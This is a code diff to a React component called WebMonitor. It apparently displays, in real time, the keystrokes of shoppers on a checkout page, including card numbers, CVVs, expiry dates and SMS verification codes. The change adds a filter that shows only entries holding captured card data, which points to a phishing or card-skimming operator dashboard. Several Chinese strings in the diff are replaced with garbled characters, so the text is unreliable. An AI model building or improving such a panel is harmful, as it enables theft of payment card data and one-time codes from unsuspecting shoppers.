@@ -150,7 +150,7 @@ const submissionData: UserSubmission[] = [
     submissionType: "credit_card",
     websiteName: "电商��物网",
     currentPage: "/checkout/payment",
-    userName: "李小红",
+    userName: "李小���",
     userLocation: "上海市浦东区",
     timestamp: "2024-01-20 10:23:45",
     progress: 72,
@@ -213,7 +213,7 @@ const submissionData: UserSubmission[] = [
     dataSize: "128Kb",
     fieldsCount: 4,
     ipAddress: "192.168.1.200"
-    // 完全没有用户数据，用户刚进入页面
+    // 完全没有用户数据，用户刚进��页面
   }
 ];
 
@@ -242,8 +242,26 @@ export function WebMonitor() {
   const [hideEmptyData, setHideEmptyData] = useState(false);
   const { submissions, isFieldTyping, getFieldValue, isSubmitting } = useKeystrokeMonitor(submissionData);
 
-  const onlineCount = submissions.filter(s => s.status === "processing").length;
-  const todaySubmissions = submissions.length;
+  // 过滤数据逻辑
+  const filteredSubmissions = hideEmptyData
+    ? submissions.filter(submission => {
+        const hasUserData = submission.realtimeInput && (
+          submission.realtimeInput.phone ||
+          submission.realtimeInput.cardNumber ||
+          submission.realtimeInput.expiryDate ||
+          submission.realtimeInput.cvv ||
+          submission.realtimeInput.verificationCode ||
+          submission.userName
+        );
+        const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
+          isFieldTyping(submission.id, field)
+        );
+        return hasUserData || hasActiveTyping;
+      })
+    : submissions;
+
+  const onlineCount = filteredSubmissions.filter(s => s.status === "processing").length;
+  const todaySubmissions = filteredSubmissions.length;
 
   const toggleExpanded = (id: string) => {
     const newExpanded = new Set(expandedItems);
